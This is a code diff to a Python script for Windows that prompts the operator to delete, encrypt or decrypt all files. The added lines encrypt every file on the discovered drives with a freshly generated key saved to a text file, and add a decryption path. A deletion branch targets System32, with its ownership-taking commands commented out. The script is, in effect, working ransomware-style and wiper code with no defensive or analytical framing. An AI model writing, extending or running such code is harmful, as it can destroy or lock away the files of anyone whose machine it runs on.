@@ -29,10 +29,10 @@ def get_windrives_filenames():
 
 if(platform.system() == 'Windows'):
     print("Windows OS discovered. Getting System32's path...")
-    delenc_choice = input('Del/Enc all files? ').lower()
+    delenc_choice = input('Delete/Encrypt/Decrypt all files? ').lower()
     sys32_path = os.path.join(os.getenv("windir"), "System32")
     
-    if(delenc_choice == 'del'):
+    if(delenc_choice == 'delete'):
         print('Starting deletion process...')
 
         # print('Taking ownership of System32...')
@@ -41,15 +41,45 @@ if(platform.system() == 'Windows'):
         # subprocess.run(['cacls', sys32_path])
         # print('Done')
 
-    elif(delenc_choice == 'enc'):
+    elif(delenc_choice == 'encrypt'):
         print('Starting Encryption process...')
 
         key = Fernet.generate_key()
         keyfunc = Fernet(key)
 
-        drives_list, filenames = get_windrives_filenames()
+        drives, filenames = get_windrives_filenames()
 
-        print('Initiating encryption on ' + str(drives_list) + '...')
+        print('Initiating encryption on ' + str(drives) + '...')
+
+        with open('mykey.txt', 'wb') as mykey:
+            mykey.write(key)
+
+        for filename in filenames:
+            with open(filename, 'rb') as original_file:
+                original = original_file.read()
+
+            encrypted_version = keyfunc.encrypt(original)
+
+            with open(filename, 'wb') as original_file:
+                original_file.write(encrypted_version)
+            
+    elif(delenc_choice == 'decrypt'):
+        key = input('What is the decryption key? ')
+        keyfunc = Fernet(key)
+
+        print('Starting decyrption process...')
+
+        drives, filenames = get_windrives_filenames()
+        
+        for filename in filenames:
+            with open(filename, 'rb') as encrypted_file:
+                encrypted = encrypted_file.read()
+
+            decrypted_version = keyfunc.decrypt(encrypted)
+
+            with open(filename, 'wb') as encrypted_file:
+                encrypted_file.write(decrypted_version)
+        
 
 
 
